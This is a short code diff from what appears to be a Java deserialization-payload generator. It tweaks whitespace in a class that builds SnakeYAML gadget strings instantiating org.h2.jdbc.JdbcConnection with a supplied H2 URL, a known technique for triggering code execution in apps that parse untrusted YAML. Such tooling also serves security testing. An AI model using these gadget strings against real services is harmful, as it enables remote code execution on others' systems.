@@ -15,8 +15,8 @@ public class H2DataBase implements ObjectPayload<Object> {
             .replace("\\", "\\\\")  // 转义反斜杠 \ → \\
             .replace("\"", "\\\"");  // 转义双引号 " → \"
 
-        String exp1 = "!!org.h2.jdbc.JdbcConnection [ \"" + escaped_h2_url + "\", !!java.util.Properties []]";
-        String exp2 = "!!org.h2.jdbc.JdbcConnection [ \"" + escaped_h2_url + "\", !!java.util.Properties [], \"a\", \"b\", false]";
+        String exp1 = "!!org.h2.jdbc.JdbcConnection [\"" + escaped_h2_url + "\", !!java.util.Properties []]";
+        String exp2 = "!!org.h2.jdbc.JdbcConnection [\"" + escaped_h2_url + "\", !!java.util.Properties [], \"a\", \"b\", false]";
 
         return exp1 + "\n" + exp2;
     }
